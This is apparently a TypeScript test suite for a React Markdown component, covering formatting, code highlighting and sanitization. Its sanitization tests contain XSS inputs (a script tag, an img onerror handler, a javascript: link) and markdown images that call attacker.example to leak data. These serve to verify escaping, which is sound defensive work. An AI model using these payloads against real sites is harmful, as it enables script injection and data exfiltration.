import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { Markdown } from '../app/components/Markdown'

function render(text: string, className?: string): string {
  return renderToStaticMarkup(createElement(Markdown, { className }, text))
}

describe('Markdown (ATH-63)', () => {
  describe('formatting', () => {
    it('renders paragraphs, bullets, and bold', () => {
      const html = render(
        'First para\n\nSecond para\n\n- one\n- two\n\n**bold**'
      )
      expect(html.match(/<p /g)).toHaveLength(3)
      expect(html).toContain('<ul')
      expect(html.match(/<li/g)).toHaveLength(2)
      expect(html).toContain('<strong')
    })

    it('keeps soft newlines inside a paragraph (pre-line on <p>)', () => {
      const html = render('line one\nline two')
      expect(html).toMatch(
        /<p [^>]*whitespace-pre-line[^>]*>line one\nline two<\/p>/
      )
    })

    it('does not put pre-line on list items (loose-list spacing)', () => {
      const html = render('- a\n\n- b')
      expect(html).not.toMatch(/<li[^>]*whitespace-pre-line/)
    })

    it('renders ordered lists and blockquotes', () => {
      const html = render('1. first\n2. second\n\n> quoted')
      expect(html).toContain('<ol')
      expect(html).toContain('<blockquote')
    })

    it('styles inline code as a chip', () => {
      const html = render('use `foo()` here')
      expect(html).toMatch(/<code [^>]*bg-gray-800[^>]*>foo\(\)<\/code>/)
    })

    it('applies the wrapper className', () => {
      expect(render('x', 'mt-2 text-sm')).toMatch(/^<div class="mt-2 text-sm">/)
    })
  })

  describe('code fences', () => {
    it('highlights a language-tagged fence', () => {
      const html = render('```ts\nconst x: number = 1\n```')
      expect(html).toContain('<pre')
      expect(html).toContain('language-ts')
      expect(html).toContain('hljs-keyword')
    })

    it('leaves an unlabeled fence unhighlighted (no auto-detect)', () => {
      const html = render('```\nconst x = 1\n```')
      expect(html).toContain('<pre')
      expect(html).not.toContain('hljs-')
    })

    it('does not throw on an unknown fence language', () => {
      const html = render('```notalang\nsome text\n```')
      expect(html).toContain('some text')
    })
  })

  describe('sanitization', () => {
    it('shows raw HTML as inert escaped text, never as elements', () => {
      const html = render(
        '<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>'
      )
      expect(html).not.toContain('<script')
      expect(html).not.toContain('<img')
      // Escaped, so it displays as text and cannot execute.
      expect(html).toContain('&lt;script&gt;')
      expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;')
    })

    it('strips javascript: link targets', () => {
      const html = render('[click](javascript:alert(1))')
      expect(html).not.toContain('javascript:')
    })

    it('opens safe links in a new tab with noopener noreferrer', () => {
      const html = render('[docs](https://example.com/x)')
      expect(html).toContain('href="https://example.com/x"')
      expect(html).toContain('target="_blank"')
      expect(html).toContain('rel="noopener noreferrer"')
    })

    it('never renders markdown images (external-request channel)', () => {
      const html = render('![secret](https://attacker.example/p.png?d=abc)')
      expect(html).not.toContain('<img')
      expect(html).not.toContain('attacker.example')
      expect(html).toContain('[image: secret]')
    })

    it('drops an image with no alt text entirely', () => {
      const html = render('![](https://attacker.example/p.png)')
      expect(html).not.toContain('attacker.example')
      expect(html).not.toContain('<img')
    })

    it('does not leak the hast node onto DOM elements', () => {
      expect(render('para\n\n- item\n\n`c`')).not.toContain('node=')
    })
  })
})
